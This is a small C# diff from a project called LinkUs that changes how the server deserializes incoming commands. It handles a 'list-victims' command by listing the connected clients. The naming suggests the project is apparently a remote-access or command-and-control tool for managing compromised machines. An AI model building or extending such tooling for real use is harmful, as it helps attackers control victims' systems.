@@ -59,8 +59,8 @@ namespace LinkUs
             }
             else {
                 var jsonSerializer = new JsonSerializer();
-                var commandLine = jsonSerializer.Deserialize<string>(package.Content);
-                if (commandLine == "list-victims") {
+                var commandLine = jsonSerializer.Deserialize<Command>(package.Content);
+                if (commandLine.Name == "list-victims") {
                     var clients = _activeTransmitter.Keys;
                     var value = string.Join(Environment.NewLine, clients.Select(x => x.ToString()));
                     var packageResponse = package.CreateResponsePackage(jsonSerializer.Serialize(value));
